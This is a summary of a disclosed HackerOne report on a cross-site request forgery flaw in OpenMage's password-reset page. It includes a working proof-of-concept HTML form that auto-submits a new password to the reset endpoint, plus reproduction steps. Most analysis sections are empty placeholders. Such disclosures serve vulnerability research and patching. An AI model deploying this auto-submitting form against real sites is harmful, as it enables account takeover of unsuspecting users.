# CSRF in changing password after using reset password link

## Metadata
- **Source:** HackerOne
- **Report:** 1086752 | https://hackerone.com/reports/1086752
- **Submitted:** 2021-01-25
- **Reporter:** xenx
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** CVE-2021-21395
- **Category:** web-api

## Summary
## Summary:
Hey OpenMage, the forgot password page is not protected against CSRF attack which can lead to changing password. Use the below form  to test
```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="passw

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Hey OpenMage, the forgot password page is not protected against CSRF attack which can lead to changing password. Use the below form  to test
```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="password123" />
    </form>
   <script>document.forms[0].submit()</script>
  </body>
</html>
```
## Steps To Reproduce:

  1. Go to  ```https://demo.openmage.org/customer/account/forgotpassword/```
  2. Enter your email  and ask for password reset link
  3. Load the password reset link and after loading it close it
  4. Now load the above form and boom, password will be changed.

## Impact

Password reset via CSRF

</details>

---
*Analysed by Claude on 2026-05-24*
